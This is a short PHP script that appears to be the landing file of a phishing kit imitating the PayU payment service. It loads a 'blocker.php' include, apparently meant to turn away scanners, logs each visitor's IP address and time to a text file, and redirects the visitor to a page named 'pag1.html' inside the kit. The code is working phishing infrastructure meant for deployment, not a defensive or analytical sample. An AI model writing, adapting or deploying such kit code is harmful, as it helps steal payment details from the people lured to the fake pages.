<?php 
include("./PAYU/blocker.php");

$ip = getenv("REMOTE_ADDR");
$file = fopen("Vu.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");
$src="PAYU/pag1.html";
header("location:$src");
?>